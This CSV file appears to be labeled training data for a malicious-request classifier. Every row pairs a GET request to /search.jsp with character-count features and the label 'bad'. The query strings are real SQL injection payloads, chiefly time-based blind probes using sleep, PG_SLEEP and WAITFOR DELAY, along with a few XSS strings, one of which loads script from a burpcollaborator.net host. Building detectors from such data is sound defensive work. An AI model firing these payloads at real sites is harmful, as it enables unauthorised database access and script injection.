method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,b'/search.jsp?query=1+Or+sleep(4)+#',b'',0,0,0,1,3,1,bad
GET,b'/search.jsp?query=1+Or+sleep(4)+/*',b'',0,0,0,1,3,1,bad
GET,"b""/search.jsp?query='+||+sleep(5)+--+-""",b'',1,0,1,1,4,1,bad
GET,"b""/search.jsp?query='+||+sleep(5)+#""",b'',1,0,0,1,3,1,bad
GET,"b""/search.jsp?query='+||+sleep(5)+/*""",b'',1,0,0,1,3,1,bad
GET,"b""/search.jsp?query='+&&+sleep(5)+--+-""",b'',1,0,1,1,4,1,bad
GET,"b""/search.jsp?query='+&&+sleep(5)+#""",b'',1,0,0,1,3,1,bad
GET,"b""/search.jsp?query='+&&+sleep(5)+/*""",b'',1,0,0,1,3,1,bad
GET,"b""/search.jsp?query=')+&&+sleep(5)+--+-""",b'',1,0,1,1,4,1,bad
GET,"b""/search.jsp?query=')+&&+sleep(5)+#""",b'',1,0,0,1,3,1,bad
GET,"b""/search.jsp?query=')+&&+sleep(5)+/*""",b'',1,0,0,1,3,1,bad
GET,"b'/search.jsp?query=""+||+sleep(5)+--+-'",b'',0,1,1,1,4,1,bad
GET,"b'/search.jsp?query=""+||+sleep(5)+#'",b'',0,1,0,1,3,1,bad
GET,"b'/search.jsp?query=""+||+sleep(5)+/*'",b'',0,1,0,1,3,1,bad
GET,"b'/search.jsp?query=""+&&+sleep(5)+--+-'",b'',0,1,1,1,4,1,bad
GET,"b'/search.jsp?query=""+&&+sleep(5)+#'",b'',0,1,0,1,3,1,bad
GET,"b'/search.jsp?query=""+&&+sleep(5)+/*'",b'',0,1,0,1,3,1,bad
GET,"b'/search.jsp?query="")+&&+sleep(5)+--+-'",b'',0,1,1,1,4,1,bad
GET,"b'/search.jsp?query="")+&&+sleep(5)+#'",b'',0,1,0,1,3,1,bad
GET,"b'/search.jsp?query="")+&&+sleep(5)+/*'",b'',0,1,0,1,3,1,bad
GET,"b""/search.jsp?query='+=+'1'+&&+sleep(4)+&&+'1'+=+'1""",b'',6,0,0,1,8,1,bad
GET,"b""/search.jsp?query='+=+'2'+||+sleep(4)+&&+'1'+=+'1""",b'',6,0,0,1,8,1,bad
GET,"b'/search.jsp?query=""+=+""1""+&&+sleep(4)+&&+""1""+=+""1'",b'',0,6,0,1,8,1,bad
GET,"b'/search.jsp?query=""+=+""2""+||+sleep(4)+&&+""1""+=+""1'",b'',0,6,0,1,8,1,bad
GET,"b""/search.jsp?query='+=+'1'+&&+sleep(4)+&&+'1'+=+'1'+--+-""",b'',7,0,1,1,10,1,bad
GET,"b""/search.jsp?query='+=+'2'+||+sleep(4)+&&+'1'+=+'1'+--+-""",b'',7,0,1,1,10,1,bad
GET,"b""/search.jsp?query='+=+'1'+&&+sleep(4)+&&+'1'+=+'1'+#""",b'',7,0,0,1,9,1,bad
GET,"b""/search.jsp?query='+=+'2'+||+sleep(4)+&&+'1'+=+'1'+#""",b'',7,0,0,1,9,1,bad
GET,"b""/search.jsp?query='+=+'1'+&&+sleep(4)+&&+'1'+=+'1'+/*""",b'',7,0,0,1,9,1,bad
GET,"b""/search.jsp?query='+=+'2'+||+sleep(4)+&&+'1'+=+'1'+/*""",b'',7,0,0,1,9,1,bad
GET,"b'/search.jsp?query=""+=+""1""+&&+sleep(4)+&&+""1""+=+""1""+--+-'",b'',0,7,1,1,10,1,bad
GET,"b'/search.jsp?query=""+=+""2""+||+sleep(4)+&&+""1""+=+""1""+--+-'",b'',0,7,1,1,10,1,bad
GET,"b'/search.jsp?query=""+=+""1""+&&+sleep(4)+&&+""1""+=+""1""+#'",b'',0,7,0,1,9,1,bad
GET,"b'/search.jsp?query=""+=+""2""+||+sleep(4)+&&+""1""+=+""1""+#'",b'',0,7,0,1,9,1,bad
GET,"b'/search.jsp?query=""+=+""1""+&&+sleep(4)+&&+""1""+=+""1""+/*'",b'',0,7,0,1,9,1,bad
GET,"b'/search.jsp?query=""+=+""2""+||+sleep(4)+&&+""1""+=+""1""+/*'",b'',0,7,0,1,9,1,bad
GET,b'/search.jsp?query=1+=+1+&&+sleep(4)+&&+1+=+1',b'',0,0,0,1,8,1,bad
GET,b'/search.jsp?query=1+=+2+||+sleep(4)+&&+1+=+1',b'',0,0,0,1,8,1,bad
GET,"b""/search.jsp?query=1+=+1+&&+sleep(4)+&&+'1'+=+'1'+--+-""",b'',4,0,1,1,10,1,bad
GET,"b""/search.jsp?query=1+=+2+||+sleep(4)+&&+'1'+=+'1'+--+-""",b'',4,0,1,1,10,1,bad
GET,"b""/search.jsp?query=1+=+1+&&+sleep(4)+&&+'1'+=+'1'+#""",b'',4,0,0,1,9,1,bad
GET,"b""/search.jsp?query=1+=+2+||+sleep(4)+&&+'1'+=+'1'+#""",b'',4,0,0,1,9,1,bad
GET,"b""/search.jsp?query=1+=+1+&&+sleep(4)+&&+'1'+=+'1'+/*""",b'',4,0,0,1,9,1,bad
GET,"b""/search.jsp?query=1+=+2+||+sleep(4)+&&+'1'+=+'1'+/*""",b'',4,0,0,1,9,1,bad
GET,b'/search.jsp?query=1+&&+sleep(4)+--+-',b'',0,0,1,1,4,1,bad
GET,b'/search.jsp?query=1+&&+sleep(4)+#',b'',0,0,0,1,3,1,bad
GET,b'/search.jsp?query=1+&&+sleep(4)+/*',b'',0,0,0,1,3,1,bad
GET,b'/search.jsp?query=1+||+sleep(4)+--+-',b'',0,0,1,1,4,1,bad
GET,b'/search.jsp?query=1+||+sleep(4)+#',b'',0,0,0,1,3,1,bad
GET,b'/search.jsp?query=1+||+sleep(4)+/*',b'',0,0,0,1,3,1,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query="";'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=');""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query="");'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query='));""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""));'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query="";'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=');""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query="");'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query='));""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""));'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=';""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query="";'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=');""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query="");'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query='));""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""));'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=';+SeleCT+1+--+-""",b'',1,0,1,0,4,1,bad
GET,"b'/search.jsp?query="";+SeleCT+1+--+-'",b'',0,1,1,0,4,1,bad
GET,"b""/search.jsp?query=');+SeleCT+1+--+-""",b'',1,0,1,0,4,1,bad
GET,"b'/search.jsp?query="");+SeleCT+1+--+-'",b'',0,1,1,0,4,1,bad
GET,"b""/search.jsp?query='));+SeleCT+1+--+-""",b'',1,0,1,0,4,1,bad
GET,"b'/search.jsp?query=""));+SeleCT+1+--+-'",b'',0,1,1,0,4,1,bad
GET,"b""/search.jsp?query=';+SeleCT+1+#""",b'',1,0,0,0,3,1,bad
GET,"b'/search.jsp?query="";+SeleCT+1+#'",b'',0,1,0,0,3,1,bad
GET,"b""/search.jsp?query=');+SeleCT+1+#""",b'',1,0,0,0,3,1,bad
GET,"b'/search.jsp?query="");+SeleCT+1+#'",b'',0,1,0,0,3,1,bad
GET,"b""/search.jsp?query='));+SeleCT+1+#""",b'',1,0,0,0,3,1,bad
GET,"b'/search.jsp?query=""));+SeleCT+1+#'",b'',0,1,0,0,3,1,bad
GET,"b""/search.jsp?query=';+SeleCT+1+/*""",b'',1,0,0,0,3,1,bad
GET,"b'/search.jsp?query="";+SeleCT+1+/*'",b'',0,1,0,0,3,1,bad
GET,"b""/search.jsp?query=');+SeleCT+1+/*""",b'',1,0,0,0,3,1,bad
GET,"b'/search.jsp?query="");+SeleCT+1+/*'",b'',0,1,0,0,3,1,bad
GET,"b""/search.jsp?query='));+SeleCT+1+/*""",b'',1,0,0,0,3,1,bad
GET,"b'/search.jsp?query=""));+SeleCT+1+/*'",b'',0,1,0,0,3,1,bad
GET,"b'/search.jsp?query=abraca+dabra\'""`)}];/*--+-#%00%0A'",b'',1,1,1,0,2,0,bad
GET,"b""/search.jsp?query=admin'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=-6513%27%20OR%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL--%20SpSw',b'',1,0,1,2,8,1,bad
GET,"b""/search.jsp?query=admin%20waitfor%20delay%20'0:0:15'%20--%20""",b'',2,0,1,0,5,2,bad
GET,b'/search.jsp?query=admin%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20',b'',0,0,1,0,4,0,bad
GET,b'/search.jsp?query=admin%20OR%202%2B669-669-1=0%2B0%2B0%2B1',b'',0,0,0,0,2,0,bad
GET,"b'/search.jsp?query=admin""%20OR%202%2B764-764-1=0%2B0%2B0%2B1%20--%20'",b'',0,1,1,0,4,0,bad
GET,"b""/search.jsp?query='xor(if(now()=sysdate(),sleep(30),0))or""",b'',1,0,0,5,0,1,bad
GET,"b""/search.jsp?query=admin@admin.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,"b'/search.jsp?query=orwa(select(0)from(select(sleep(15)))v)/*\'%2B(select(0)from(select(sleep(15)))v)%2B\'""%2B(select(0)from(select(sleep(15)))v)%2B""*/'",b'',2,2,0,15,0,9,bad
GET,b'/search.jsp?query=if(now()=sysdate()%2Csleep(15)%2C0)',b'',0,0,0,4,0,1,bad
GET,"b""/search.jsp?query=admin';%20waitfor%20delay%20'0:0:15'%20--%20""",b'',3,0,1,0,5,2,bad
GET,"b""/search.jsp?query=admin'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,"b""/search.jsp?query=admin')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=1%00%C0%A7%C0%A2%252527%252522',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=admin'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,"b'/search.jsp?query=(select(0)from(select(sleep(15)))v)/*\'%2B(select(0)from(select(sleep(15)))v)%2B\'""%2B(select(0)from(select(sleep(15)))v)%2B""*/'",b'',2,2,0,15,0,9,bad
GET,b'/search.jsp?query=gGBw={vsCx}&firc=<',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=orwa';%20waitfor%20delay%20'0:0:15'%20--%20""",b'',3,0,1,0,5,2,bad
GET,b'/search.jsp?query=c4aQYcql',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1%20waitfor%20delay%20'0:0:15'%20--%20""",b'',2,0,1,0,5,2,bad
GET,"b'/search.jsp?query=0%27XOR(if(now()=sysdate(),sleep(11),0))XOR%27Z'",b'',2,0,0,5,0,1,bad
GET,"b""/search.jsp?query=orwa'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,"b'/search.jsp?query=orwa""XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR""Z'",b'',0,2,0,5,0,1,bad
GET,"b'/search.jsp?query=orwa-1""%20OR%202%2B804-804-1=0%2B0%2B0%2B1%20--%20'",b'',0,1,1,0,4,0,bad
GET,b'/search.jsp?query=%40%40KFdwo',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=u]H[ww6KrA9F.x-F'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,"b""/search.jsp?query=orwa@orwa.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,b'/search.jsp?query=orwa%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20',b'',0,0,1,0,4,0,bad
GET,"b""/search.jsp?query=admin');%20waitfor%20delay%20'0:0:9'""",b'',3,0,0,0,3,2,bad
GET,"b""/search.jsp?query='xor(if(mid(database(),1,1)=0x41,sleep(30),0))or""",b'',1,0,0,5,0,1,bad
GET,"b""/search.jsp?query=orwa')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,"b""/search.jsp?query=orwa'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=1%20AND%20(SELECT%208603%20FROM%20(SELECT(SLEEP(10)))xMdQ)',b'',0,0,0,4,5,3,bad
GET,"b""/search.jsp?query=xx49236287'%20or%208896=8896--""",b'',1,0,1,0,2,0,bad
GET,"b'/search.jsp?query=1)%20OR%20ELT(2023=2023,SLEEP(5))#'",b'',0,0,0,2,2,1,bad
GET,"b""/search.jsp?query=orwa'%20OR%201=1--""",b'',1,0,1,0,2,0,bad
GET,b'/search.jsp?query=(SELECT%20(CASE%20WHEN%20(9967=9967)%20THEN%2010%20ELSE%20(SELECT%204619%20UNION%20SELECT%207284)%20END))',b'',0,0,0,4,12,4,bad
GET,"b'/search.jsp?query=10%20AND%20(SELECT%201030%20FROM(SELECT%20COUNT(*),CONCAT(0x7176717071,(SELECT%20(ELT(1030=1030,1))),0x7176717871,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)'",b'',0,0,0,9,11,4,bad
GET,b'/search.jsp?query=10%20AND%20(SELECT%204814%20FROM%20(SELECT(SLEEP(5)))jQqq)',b'',0,0,0,4,5,3,bad
GET,b'/search.jsp?query=10%20UNION%20ALL%20SELECT',b'',0,0,0,0,3,2,bad
GET,b'/search.jsp?query=+or+sleep(0.2)%23)',b'',0,0,0,1,2,1,bad
GET,"b""/search.jsp?query=-1;%20waitfor%20delay%20'0:0:10'%20--%20""",b'',2,0,1,0,5,2,bad
GET,"b""/search.jsp?query=Be7BtCuD'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=20PVEY5L',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=orwa\'""'",b'',1,1,0,0,0,0,bad
GET,b'/search.jsp?query=1;SELECT',b'',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=orwa%27;%20waitfor%20delay%20%270:0:5%27%20--%20',b'',3,0,1,0,5,2,bad
GET,b'/search.jsp?query=orwa%27);%20waitfor%20delay%20%270:0:6%27%20--%20',b'',3,0,1,0,5,2,bad
GET,"b""/search.jsp?query=0'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,"b'/search.jsp?query=0""XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR""Z'",b'',0,2,0,5,0,1,bad
GET,"b""/search.jsp?query=-1'%20OR%202%2B388-388-1=0%2B0%2B0%2B1%20--%20""",b'',1,0,1,0,4,0,bad
GET,"b""/search.jsp?query=-1'%20OR%202%2B251-251-1=0%2B0%2B0%2B1%20or%20'4dbGgO0h'='""",b'',4,0,0,0,4,0,bad
GET,b'/search.jsp?query=-1%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20',b'',0,0,1,0,4,0,bad
GET,b'/search.jsp?query=-1%20OR%202%2B669-669-1=0%2B0%2B0%2B1',b'',0,0,0,0,2,0,bad
GET,"b'/search.jsp?query=-1""%20OR%202%2B764-764-1=0%2B0%2B0%2B1%20--%20'",b'',0,1,1,0,4,0,bad
GET,b'/search.jsp?query=%40%408orwa',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=(select(0)from(select(sleep(6)))v)/*\'+(select(0)from(select(sleep(6)))v)+\'""+(select(0)from(select(sleep(6)))v)+""*/'",b'',2,2,0,15,4,9,bad
GET,"b""/search.jsp?query=orwa';%20waitfor%20delay%20'0:0:6'%20--%20""",b'',3,0,1,0,5,2,bad
GET,"b""/search.jsp?query=orwa')""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=(select(0)from(select(sleep(13)))v)/*\'+(select(0)from(select(sleep(13)))v)+\'\\""+(select(0)from(select(sleep(13)))v)+\\""*/'",b'',2,2,0,15,4,9,bad
GET,"b""/search.jsp?query='||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||'""",b'',2,0,0,4,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=1'""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query='""",b'',1,0,0,0,0,0,bad
GET,"b""/search.jsp?query=';WAITFOR""",b'',1,0,0,0,0,1,bad
GET,b'/search.jsp?query=21',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=',b'',0,0,0,0,0,0,bad
GET,b'/search.jsp?query=+sqlvuln',b'',0,0,0,0,1,0,bad
GET,b'/search.jsp?query=28',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""))'",b'',0,1,0,0,0,0,bad
GET,b'/search.jsp?query=declare',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=""><script'",b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,b'/search.jsp?query=;',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=</script><svg/onload=\'+/""/+/onmouseover=1/+(s=document.createElement(/script/.source),s.stack=Error().stack,s.src=(/,/+/xxx.burpcollaborator.net/).slice(2),document.documentElement.appendChild(s))//\'>'",b'',2,1,0,6,4,0,bad
GET,b'/search.jsp?query=%3C%22img',b'',0,1,0,0,0,0,bad
GET,"b""/search.jsp?query=/admin'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=/-6513%27%20OR%20%28SELECT%20INSTR2%28NULL%2CNULL%29%20FROM%20DUAL%29%20IS%20NULL--%20SpSw',b'',1,0,1,2,8,1,bad
GET,"b""/search.jsp?query=/admin%20waitfor%20delay%20'0:0:15'%20--%20""",b'',2,0,1,0,5,2,bad
GET,b'/search.jsp?query=/admin%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20',b'',0,0,1,0,4,0,bad
GET,b'/search.jsp?query=/admin%20OR%202%2B669-669-1=0%2B0%2B0%2B1',b'',0,0,0,0,2,0,bad
GET,"b'/search.jsp?query=/admin""%20OR%202%2B764-764-1=0%2B0%2B0%2B1%20--%20'",b'',0,1,1,0,4,0,bad
GET,"b""/search.jsp?query=/'xor(if(now()=sysdate(),sleep(30),0))or""",b'',1,0,0,5,0,1,bad
GET,"b""/search.jsp?query=/admin@admin.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,"b'/search.jsp?query=/orwa(select(0)from(select(sleep(15)))v)/*\'%2B(select(0)from(select(sleep(15)))v)%2B\'""%2B(select(0)from(select(sleep(15)))v)%2B""*/'",b'',2,2,0,15,0,9,bad
GET,b'/search.jsp?query=/if(now()=sysdate()%2Csleep(15)%2C0)',b'',0,0,0,4,0,1,bad
GET,"b""/search.jsp?query=/admin';%20waitfor%20delay%20'0:0:15'%20--%20""",b'',3,0,1,0,5,2,bad
GET,"b""/search.jsp?query=/admin'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,"b""/search.jsp?query=/admin')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=/1%00%C0%A7%C0%A2%252527%252522',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/admin'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,"b'/search.jsp?query=/(select(0)from(select(sleep(15)))v)/*\'%2B(select(0)from(select(sleep(15)))v)%2B\'""%2B(select(0)from(select(sleep(15)))v)%2B""*/'",b'',2,2,0,15,0,9,bad
GET,b'/search.jsp?query=/gGBw={vsCx}&firc=<',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/orwa';%20waitfor%20delay%20'0:0:15'%20--%20""",b'',3,0,1,0,5,2,bad
GET,b'/search.jsp?query=/c4aQYcql',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/1%20waitfor%20delay%20'0:0:15'%20--%20""",b'',2,0,1,0,5,2,bad
GET,"b'/search.jsp?query=/0%27XOR(if(now()=sysdate(),sleep(11),0))XOR%27Z'",b'',2,0,0,5,0,1,bad
GET,"b""/search.jsp?query=/orwa'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,"b'/search.jsp?query=/orwa""XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR""Z'",b'',0,2,0,5,0,1,bad
GET,"b'/search.jsp?query=/orwa-1""%20OR%202%2B804-804-1=0%2B0%2B0%2B1%20--%20'",b'',0,1,1,0,4,0,bad
GET,b'/search.jsp?query=/%40%40KFdwo',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/u]H[ww6KrA9F.x-F'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,"b""/search.jsp?query=/orwa@orwa.com'%7C%7CDBMS_PIPE.RECEIVE_MESSAGE(CHR(98)%7C%7CCHR(98)%7C%7CCHR(98)%2C15)%7C%7C'""",b'',2,0,0,4,0,0,bad
GET,b'/search.jsp?query=/orwa%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20',b'',0,0,1,0,4,0,bad
GET,"b""/search.jsp?query=/admin');%20waitfor%20delay%20'0:0:9'""",b'',3,0,0,0,3,2,bad
GET,"b""/search.jsp?query=/'xor(if(mid(database(),1,1)=0x41,sleep(30),0))or""",b'',1,0,0,5,0,1,bad
GET,"b""/search.jsp?query=/orwa')%20OR%20565=(SELECT%20565%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,"b""/search.jsp?query=/orwa'%20OR%20227=(SELECT%20227%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=/1%20AND%20(SELECT%208603%20FROM%20(SELECT(SLEEP(10)))xMdQ)',b'',0,0,0,4,5,3,bad
GET,"b""/search.jsp?query=/xx49236287'%20or%208896=8896--""",b'',1,0,1,0,2,0,bad
GET,"b'/search.jsp?query=/1)%20OR%20ELT(2023=2023,SLEEP(5))#'",b'',0,0,0,2,2,1,bad
GET,"b""/search.jsp?query=/orwa'%20OR%201=1--""",b'',1,0,1,0,2,0,bad
GET,b'/search.jsp?query=/(SELECT%20(CASE%20WHEN%20(9967=9967)%20THEN%2010%20ELSE%20(SELECT%204619%20UNION%20SELECT%207284)%20END))',b'',0,0,0,4,12,4,bad
GET,"b'/search.jsp?query=/10%20AND%20(SELECT%201030%20FROM(SELECT%20COUNT(*),CONCAT(0x7176717071,(SELECT%20(ELT(1030=1030,1))),0x7176717871,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x)a)'",b'',0,0,0,9,11,4,bad
GET,b'/search.jsp?query=/10%20AND%20(SELECT%204814%20FROM%20(SELECT(SLEEP(5)))jQqq)',b'',0,0,0,4,5,3,bad
GET,b'/search.jsp?query=/10%20UNION%20ALL%20SELECT',b'',0,0,0,0,3,2,bad
GET,b'/search.jsp?query=/+or+sleep(0.2)%23)',b'',0,0,0,1,2,1,bad
GET,"b""/search.jsp?query=/-1;%20waitfor%20delay%20'0:0:10'%20--%20""",b'',2,0,1,0,5,2,bad
GET,"b""/search.jsp?query=/Be7BtCuD'))%20OR%20335=(SELECT%20335%20FROM%20PG_SLEEP(15))--""",b'',1,0,1,2,5,2,bad
GET,b'/search.jsp?query=/20PVEY5L',b'',0,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/orwa\'""'",b'',1,1,0,0,0,0,bad
GET,b'/search.jsp?query=/1;SELECT',b'',0,0,0,0,0,1,bad
GET,b'/search.jsp?query=/orwa%27;%20waitfor%20delay%20%270:0:5%27%20--%20',b'',3,0,1,0,5,2,bad
GET,b'/search.jsp?query=/orwa%27);%20waitfor%20delay%20%270:0:6%27%20--%20',b'',3,0,1,0,5,2,bad
GET,"b""/search.jsp?query=/0'XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR'Z""",b'',2,0,0,5,0,1,bad
GET,"b'/search.jsp?query=/0""XOR(if(now()=sysdate()%2Csleep(15)%2C0))XOR""Z'",b'',0,2,0,5,0,1,bad
GET,"b""/search.jsp?query=/-1'%20OR%202%2B388-388-1=0%2B0%2B0%2B1%20--%20""",b'',1,0,1,0,4,0,bad
GET,"b""/search.jsp?query=/-1'%20OR%202%2B251-251-1=0%2B0%2B0%2B1%20or%20'4dbGgO0h'='""",b'',4,0,0,0,4,0,bad
GET,b'/search.jsp?query=/-1%20OR%202%2B949-949-1=0%2B0%2B0%2B1%20--%20',b'',0,0,1,0,4,0,bad
GET,b'/search.jsp?query=/-1%20OR%202%2B669-669-1=0%2B0%2B0%2B1',b'',0,0,0,0,2,0,bad
GET,"b'/search.jsp?query=/-1""%20OR%202%2B764-764-1=0%2B0%2B0%2B1%20--%20'",b'',0,1,1,0,4,0,bad
GET,b'/search.jsp?query=/%40%408orwa',b'',0,0,0,0,0,0,bad
GET,"b""/search.jsp?query=/)%20or%20('x'='x""",b'',3,0,0,1,2,0,bad
GET,b'/search.jsp?query=/%20or%201=1',b'',0,0,0,0,2,0,bad
GET,"b'/search.jsp?query=/(select(0)from(select(sleep(6)))v)/*\'+(select(0)from(select(sleep(6)))v)+\'""+(select(0)from(select(sleep(6)))v)+""*/'",b'',2,2,0,15,4,9,bad
GET,"b""/search.jsp?query=/orwa';%20waitfor%20delay%20'0:0:6'%20--%20""",b'',3,0,1,0,5,2,bad
GET,"b""/search.jsp?query=/orwa')""",b'',1,0,0,0,0,0,bad
GET,"b'/search.jsp?query=/(select(0)from(select(sleep(13)))v)/*\'+(select(0)from(select(sleep(13)))v)+\'\\""+(select(0)from(select(sleep(13)))v)+\\""*/'",b'',2,2,0,15,4,9,bad
